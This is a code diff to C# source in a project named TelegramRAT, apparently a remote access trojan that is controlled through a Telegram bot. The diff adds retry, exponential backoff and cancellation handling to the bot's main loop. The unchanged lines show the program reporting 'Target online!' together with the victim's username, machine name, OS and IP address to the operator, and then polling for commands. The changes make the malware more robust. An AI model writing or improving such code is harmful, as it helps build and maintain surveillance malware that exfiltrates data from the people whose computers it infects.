@@ -7,6 +7,7 @@ using System.Diagnostics;
 using Telegram.Bot.Types;
 using Telegram.Bot;
 using System.Net;
+using System.Threading;
 
 namespace TelegramRAT;
 
@@ -15,9 +16,13 @@ public static class Program
     private static readonly string BotToken = "YOUR_TELEGRAM_BOT_TOKEN";
     private static readonly long? OwnerId = null;
 
-    public static readonly TelegramBotClient Bot = new TelegramBotClient(BotToken);
-    public static readonly List<BotCommand> Commands = new();
+    private static TelegramBotClient? _bot;
+    private static List<BotCommand> _commands = new();
+    private const int MaxRetryAttempts = 5;
     private const int PollingDelay = 1000;
+
+    public static TelegramBotClient Bot => _bot ?? throw new InvalidOperationException("Bot client is not initialized.");
+    public static List<BotCommand> Commands => _commands;
 
     public static async Task Main(string[] args)
     {
@@ -27,36 +32,78 @@ public static class Program
             return;
         }
 
-        try
-        {
-            await RunAsync();
-        }
-        catch (Exception ex)
-        {
-            if (OwnerId != 0)
-            {
-                await ReportExceptionAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, ex);
+        using var cts = new CancellationTokenSource();
 
-                if (ex.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true)
+        Console.CancelKeyPress += (_, eventArgs) =>
+        {
+            eventArgs.Cancel = true;
+            cts.Cancel();
+        };
+
+        int attempt = 0;
+
+        while (!cts.IsCancellationRequested)
+        {
+            ResetSharedResources();
+            attempt++;
+
+            try
+            {
+                await RunAsync(cts.Token);
+                break;
+            }
+            catch (OperationCanceledException) when (cts.IsCancellationRequested)
+            {
+                break;
+            }
+            catch (Exception ex)
+            {
+                bool unrecoverable = IsUnrecoverable(ex);
+                var backoff = attempt < MaxRetryAttempts && !unrecoverable
+                    ? CalculateBackoffDelay(attempt)
+                    : TimeSpan.Zero;
+
+                if (OwnerId is long ownerId && ownerId != 0)
                 {
-                    await SendErrorAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, new Exception("Only one bot instance can be online at the same time."));
-                    return;
+                    var ownerMessage = new Message { Chat = new Chat { Id = ownerId } };
+                    var retryStatus = BuildRetryStatusMessage(attempt, backoff, unrecoverable);
+                    await ReportExceptionAsync(ownerMessage, ex, retryStatus);
+
+                    if (unrecoverable)
+                    {
+                        await SendErrorAsync(ownerMessage, new Exception("Only one bot instance can be online at the same time."));
+                    }
+                    else if (attempt < MaxRetryAttempts)
+                    {
+                        await Bot.SendMessage(
+                            ownerId,
+                            $"Retrying in {backoff.TotalSeconds:F0} seconds... (next attempt {attempt + 1} of {MaxRetryAttempts})",
+                            parseMode: ParseMode.Html
+                        );
+                    }
                 }
 
-                await Bot.SendMessage(
-                    OwnerId,
-                    "Attempting to restart. Please wait...",
-                    parseMode: ParseMode.Html
-                );
-            }
+                if (unrecoverable || attempt >= MaxRetryAttempts)
+                {
+                    break;
+                }
 
-            Commands.Clear();
-            await Main(args);
+                try
+                {
+                    await Task.Delay(backoff, cts.Token);
+                }
+                catch (OperationCanceledException)
+                {
+                    break;
+                }
+            }
         }
     }
 
-    private static async Task RunAsync()
+    private static async Task RunAsync(CancellationToken cancellationToken)
     {
+        cancellationToken.ThrowIfCancellationRequested();
+
         var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));
 
         var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {Utils.GetWindowsVersion()}\n\nIP: {await Utils.GetIpAddressAsync()}";
@@ -72,15 +119,47 @@ public static class Program
 
         int offset = 0;
 
-        while (true)
+        while (!cancellationToken.IsCancellationRequested)
         {
-            var updates = await Bot.GetUpdates(offset);
+            var updates = await Bot.GetUpdates(offset, cancellationToken: cancellationToken);
             if (updates.Any())
                 offset = updates.Last().Id + 1;
 
             await UpdateWorkerAsync(updates);
-            await Task.Delay(PollingDelay);
+            await Task.Delay(PollingDelay, cancellationToken);
         }
+    }
+
+    private static TimeSpan CalculateBackoffDelay(int attempt)
+    {
+        var delaySeconds = Math.Min(Math.Pow(2, attempt), 60);
+        return TimeSpan.FromSeconds(delaySeconds);
+    }
+
+    private static string BuildRetryStatusMessage(int attempt, TimeSpan backoff, bool unrecoverable)
+    {
+        if (unrecoverable)
+        {
+            return $"Run attempt {attempt} failed with an unrecoverable error.";
+        }
+
+        return backoff == TimeSpan.Zero
+            ? $"Run attempt {attempt} failed. No further retries will be attempted."
+            : $"Run attempt {attempt} failed. Retrying in {backoff.TotalSeconds:F0} seconds.";
+    }
+
+    private static bool IsUnrecoverable(Exception exception)
+        => exception.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true;
+
+    private static void ResetSharedResources()
+    {
+        if (_bot is IDisposable disposable)
+        {
+            disposable.Dispose();
+        }
+
+        _bot = new TelegramBotClient(BotToken);
+        _commands = new List<BotCommand>();
     }
 
     private static async Task UpdateWorkerAsync(IEnumerable<Update> updates)
@@ -136,12 +215,23 @@ public static class Program
         }
     }
 
-    public static async Task SendErrorAsync(Message message, Exception ex, bool includeStackTrace = false)
+    public static async Task SendErrorAsync(Message message, Exception ex, bool includeStackTrace = false, string? context = null)
     {
-        var encodedMessage = WebUtility.HtmlEncode(ex.Message);
-        var errorMessage = includeStackTrace
-            ? $"Error: {encodedMessage}\n{WebUtility.HtmlEncode(ex.StackTrace)}"
-            : $"Error: {encodedMessage}";
+        var errorParts = new List<string>();
+
+        if (!string.IsNullOrWhiteSpace(context))
+        {
+            errorParts.Add(WebUtility.HtmlEncode(context));
+        }
+
+        errorParts.Add(WebUtility.HtmlEncode(ex.Message));
+
+        if (includeStackTrace && ex.StackTrace is not null)
+        {
+            errorParts.Add(WebUtility.HtmlEncode(ex.StackTrace));
+        }
+
+        var errorMessage = $"Error: {string.Join("\n", errorParts)}";
 
         var replyMarkup = message.ReplyMarkup == null
             ? new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString()))
@@ -155,14 +245,14 @@ public static class Program
         );
     }
 
-    public static async Task ReportExceptionAsync(Message message, Exception exception)
+    public static async Task ReportExceptionAsync(Message message, Exception exception, string? context = null)
     {
         #if DEBUG
             bool includeStackTrace = true;
         #else
             bool includeStackTrace = false;
         #endif
-        await SendErrorAsync(message, exception, includeStackTrace);
+        await SendErrorAsync(message, exception, includeStackTrace, context);
     }
 
     public static async Task SendSuccessAsync(Message message, string successMessage)
